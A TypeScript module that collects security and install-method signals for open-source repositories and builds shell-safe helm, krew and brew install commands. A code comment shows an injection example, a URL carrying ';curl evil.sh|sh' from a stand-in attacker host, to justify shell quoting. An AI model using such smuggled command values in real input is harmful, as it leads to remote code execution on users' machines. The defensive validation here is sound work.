import type { Cache } from '@keco/cache';
import type { InstallMethodEntry, LandscapeEntry, Signals } from '@keco/core';
import {
  ARTIFACTHUB_REPOSITORY_KIND,
  artifactHubProvider,
  brewProvider,
  checkScores,
  depsDevProvider,
  encodeOsvKey,
  lookupLandscape,
  osvProvider,
  scorecardProvider,
  type ArtifactHubPackage,
} from '@keco/signals';
import { identifyPackage } from './rules/package-identity';

/**
 * Pass 2 — external signals (AGENTS.md §4.2). Every provider degrades to `null` on failure and
 * is recorded in `partial_signals`; nothing here may throw the analyzer off a repo (§13).
 */
export type SignalsInput = {
  repo: string; // owner/repo
  name: string; // bare repo name
  manifests: Record<string, string>;
};

export type GatherSignalsOptions = {
  /** The one manual TTL bypass, and it is per-provider (§4.2). */
  forceRefresh: string | null;
  now?: Date;
};

export type SignalsResult = {
  signals: Signals;
  /** From CNCF Landscape — `null` for the vast majority of the corpus, which isn't CNCF-hosted. */
  landscape: LandscapeEntry | null;
  install_methods: InstallMethodEntry[];
  signals_used: string[];
  partial_signals: string[];
};

export async function gatherSignals(
  cache: Cache,
  input: SignalsInput,
  options: GatherSignalsOptions,
): Promise<SignalsResult> {
  const now = options.now ?? new Date();
  const used: string[] = [];
  const partial: string[] = [];
  const force = (name: string) => options.forceRefresh === name;

  const landscape = await lookupLandscape(cache, input.repo, {
    forceRefresh: force('cncf-landscape'),
    now,
  });
  if (landscape.partial) partial.push('cncf-landscape');
  else used.push('cncf-landscape');

  const installMethods: InstallMethodEntry[] = [];

  // Bulk file, cached under a fixed key: one network call per TTL window for the whole corpus,
  // never one per repo (§4.2).
  const brew = await brewProvider(cache).fetch('all', { forceRefresh: force('brew'), now });
  if (brew.value) {
    used.push('brew');
    const formula = brew.value.find((f) => f.name.toLowerCase() === input.name.toLowerCase());
    if (formula) {
      installMethods.push({
        method: 'brew',
        command: `brew install ${formula.name}`,
        source_url: `https://formulae.brew.sh/formula/${formula.name}`,
        verified_at: now.toISOString(),
      });
    }
  } else if (brew.partial) {
    partial.push('brew');
  }

  // The remaining four are independent per-repo network calls — run them concurrently rather
  // than summing their worst-case latencies. `landscape` and `brew` stay out of this group:
  // they're memoized/bulk (once per process or per corpus run), not per-repo work.
  const identity = identifyPackage(input.manifests);
  const [scorecard, depsdev, artifacthub, osv] = await Promise.all([
    scorecardProvider(cache).fetch(input.repo, { forceRefresh: force('scorecard'), now }),
    depsDevProvider(cache).fetch(input.repo, { forceRefresh: force('depsdev'), now }),
    artifactHubProvider(cache).fetch(input.name, { forceRefresh: force('artifacthub'), now }),
    identity
      ? osvProvider(cache).fetch(encodeOsvKey(identity.ecosystem, identity.name), {
          forceRefresh: force('osv'),
          now,
        })
      : Promise.resolve(null),
  ]);

  if (scorecard.value) used.push('scorecard');
  else if (scorecard.partial) partial.push('scorecard');

  if (depsdev.value) used.push('depsdev');
  else if (depsdev.partial) partial.push('depsdev');

  let osvOpenVulns: number | null = null;
  let osvFetchedAt: string | null = null;
  if (osv) {
    if (osv.value) {
      used.push('osv');
      osvOpenVulns = osv.value.vulns.length;
      osvFetchedAt = osv.fetched_at;
    } else if (osv.partial) {
      partial.push('osv');
    }
  }

  if (artifacthub.value) {
    used.push('artifacthub');
    const match = bestArtifactHubMatch(artifacthub.value.packages, input.name);
    if (match) installMethods.push(toInstallMethod(match, input.name, now));
  } else if (artifacthub.partial) {
    partial.push('artifacthub');
  }

  return {
    signals: {
      scorecard: scorecard.value
        ? {
            score: Math.min(10, Math.max(0, scorecard.value.score)),
            checks: checkScores(scorecard.value),
            fetched_at: scorecard.fetched_at!,
          }
        : null,
      osv: osvOpenVulns !== null ? { open_vulns: osvOpenVulns, fetched_at: osvFetchedAt! } : null,
      dependents: depsdev.value?.dependentCount ?? null,
    },
    landscape: landscape.entry,
    install_methods: installMethods,
    signals_used: used,
    partial_signals: partial,
  };
}

/**
 * Artifact Hub's own slug shape for a repository/package name — anything else cannot be
 * trusted to sit unescaped in a shell command a reader is about to copy-paste. This is the
 * "provably safe", not merely "a search hit exists", half of §6's "unprovable ⇒ not listed":
 * `repository.name`, `.url` and `normalized_name` come straight off a public third-party
 * search API validated only as bare `z.string()`, so an attacker who can get a chart or
 * plugin listed there controls their literal bytes.
 */
const SAFE_SLUG = /^[a-z0-9][a-z0-9._-]*$/i;

function isSafeSlug(value: string): boolean {
  return SAFE_SLUG.test(value);
}

/**
 * Only ever used to build the `helm repo add <url>` argument of a copy-pasted command, so it
 * must parse as an actual https URL. This alone does not make the *bytes* safe to interpolate
 * unquoted — `new URL('https://evil.example/;curl evil.sh|sh#')` still reports `protocol ===
 * 'https:'` while carrying `;` and `|` straight through in the path/fragment. `toInstallMethod`
 * closes that with `shellQuote`, not by trying to enumerate every dangerous character here.
 */
function isSafeHttpsUrl(value: string): boolean {
  try {
    return new URL(value).protocol === 'https:';
  } catch {
    return false;
  }
}

/**
 * POSIX single-quoting: wrap in `'...'`, escaping an embedded `'` as `'\''` (close the quote,
 * emit an escaped quote, reopen it). Makes the argument inert to the shell no matter what
 * characters it contains, which is the only way to interpolate a third-party string into a
 * copy-pasted command without re-deriving a denylist by hand (§6, §14).
 */
function shellQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * Exact, case-insensitive name match only (§6 and §14: a plugin name like `ctx` for `kubectx`
 * is a real, accepted false negative — never a false positive). Among ties, prefer the
 * `official`-flagged repository, then the most-starred: the search endpoint has no reliable
 * ordering guarantee across unrelated third-party republications of the same chart name.
 * A candidate whose `repository.name`, `normalized_name` or (for helm) `repository.url` isn't
 * safe to embed in a shell command is rejected outright — treated exactly like "no match",
 * never downgraded into a differently-shaped install method.
 */
function bestArtifactHubMatch(
  packages: ArtifactHubPackage[],
  repoName: string,
): ArtifactHubPackage | null {
  const candidates = packages.filter(
    (pkg) =>
      pkg.name.toLowerCase() === repoName.toLowerCase() &&
      pkg.normalized_name !== undefined &&
      isSafeSlug(pkg.normalized_name) &&
      pkg.repository.name !== undefined &&
      isSafeSlug(pkg.repository.name) &&
      (pkg.repository.kind === ARTIFACTHUB_REPOSITORY_KIND.helm ||
        pkg.repository.kind === ARTIFACTHUB_REPOSITORY_KIND.krew) &&
      (pkg.repository.kind !== ARTIFACTHUB_REPOSITORY_KIND.helm ||
        (pkg.repository.url !== undefined && isSafeHttpsUrl(pkg.repository.url))),
  );
  candidates.sort(
    (a, b) =>
      Number(b.official ?? false) - Number(a.official ?? false) || (b.stars ?? 0) - (a.stars ?? 0),
  );
  return candidates[0] ?? null;
}

function toInstallMethod(pkg: ArtifactHubPackage, repoName: string, now: Date): InstallMethodEntry {
  const isHelm = pkg.repository.kind === ARTIFACTHUB_REPOSITORY_KIND.helm;
  const method = isHelm ? 'helm' : 'krew';
  // repository.name/normalized_name are already validated as safe slugs by
  // bestArtifactHubMatch; encodeURIComponent here is defence in depth for the URL specifically
  // (a `/` or `?` would otherwise produce a malformed or misleading proof link).
  const sourceUrl = `https://artifacthub.io/packages/${method}/${encodeURIComponent(pkg.repository.name!)}/${encodeURIComponent(pkg.normalized_name!)}`;
  const command = isHelm
    ? `helm repo add ${pkg.repository.name} ${shellQuote(pkg.repository.url!)}\nhelm install ${repoName} ${pkg.repository.name}/${pkg.normalized_name}`
    : `kubectl krew install ${pkg.normalized_name}`;
  return { method, command, source_url: sourceUrl, verified_at: now.toISOString() };
}
